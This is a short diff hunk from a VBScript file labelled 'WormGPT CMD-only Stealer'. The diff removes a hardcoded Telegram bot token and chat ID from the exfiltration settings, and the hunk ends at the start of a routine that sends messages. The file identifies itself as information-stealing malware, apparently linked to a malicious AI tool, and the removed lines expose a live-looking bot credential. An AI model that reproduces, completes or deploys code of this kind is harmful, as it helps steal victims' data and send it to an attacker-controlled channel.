@@ -1,8 +1,8 @@
 ' WormGPT CMD-only Stealer – no PowerShell, pure VBS
 Option Explicit
 
-Const BOT_TOKEN = "8763132221:AAEaRClAyCjyoukk7oNhgO8trBgH3pH6WrY"
-Const CHAT_ID = "8344335312"
+Const BOT_TOKEN = ""
+Const CHAT_ID = ""
 
 ' ===== إرسال رسالة نصية =====
 Sub SendMsg(text)
